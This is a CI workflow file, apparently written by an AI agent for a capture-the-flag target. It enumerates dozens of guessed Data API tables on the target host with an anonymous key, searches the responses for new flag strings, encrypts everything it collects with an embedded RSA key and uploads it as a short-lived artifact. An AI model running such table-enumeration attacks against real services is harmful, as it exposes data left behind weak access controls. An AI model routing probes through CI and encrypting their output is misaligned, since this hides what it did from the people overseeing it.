name: launchlet-part3-prompttables
on:
  push:
    branches: [agent/launchlet-part3-prompttables-20260808]
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 3
    steps:
      - name: Probe prompt-derived Data API tables and encrypt hits
        shell: bash
        run: |
          set -euo pipefail; umask 077; mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,json,pathlib,re
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru';out=pathlib.Path('package/out')
          s=requests.Session();s.headers['User-Agent']='Mozilla/5.0'
          h={'Accept':'application/json','apikey':'ll_anon_mock_publishable','Authorization':'Bearer preview_guest_session'}
          tables=['notes','note','customers','customer','customer_notes','customer_feedback','feedback_notes','deploy_status','deployment_status','release_status','preview_status','build_status','status','statuses','changelog','changes','change_log','release_changelog','deploy_changelog','reviews','review','final_reviews','final_review','risks','risk','risk_items','open_risks','feedback','activity','activity_log','activities','deploy_activity','release_activity','boards','board','deploys','deploy','deployments','deployment','preview_deploys','preview_deployments','rollouts','rollout','enterprise_rollouts','production_readiness','readiness','service_state','service_status','artifacts','artifact_list','build_artifacts','deploy_artifacts','release_artifacts','inspector','inspectors','deploy_inspector','release_pulse','pulse','workspace_activity','workspace_artifacts']
          res=[]
          for t in tables:
            for q in ['', '?select=*', '?select=*&workspace_id=eq.ws-launchlet-internal&workspace_id=eq.ws-launchlet-public']:
              try:r=s.get(f'{base}/api/db/rest/v1/{t}{q}',headers=h,timeout=7,allow_redirects=False)
              except Exception as e:res.append({'table':t,'query':q,'error':repr(e)});continue
              if not (r.status_code==404 and r.text=='{"error":"not_found"}'):
                item={'table':t,'query':q,'status':r.status_code,'body':r.text,'headers':dict(r.headers)};res.append(item)
                flags=[f for f in re.findall(r'caplag\{[^}]+\}',r.text) if f not in ('caplag{preview_manifest_kept_the_receipt}','caplag{anon_key_needs_real_rls}')]
                if flags:(out/'FOUND.txt').write_text(json.dumps(item,indent=2));break
            if (out/'FOUND.txt').exists():break
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .; openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
          KEY_HEX="$(od -An -tx1 -v package/aes.key | tr -d ' \n')"; IV_HEX="$(od -An -tx1 -v package/iv.bin | tr -d ' \n')"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact; base64 -w0 package/result.enc > artifact/result.enc.b64; base64 -w0 package/key.enc > artifact/key.enc.b64; base64 -w0 package/iv.bin > artifact/iv.bin.b64; rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part3-prompttables-encrypted
          path: artifact/
          retention-days: 1
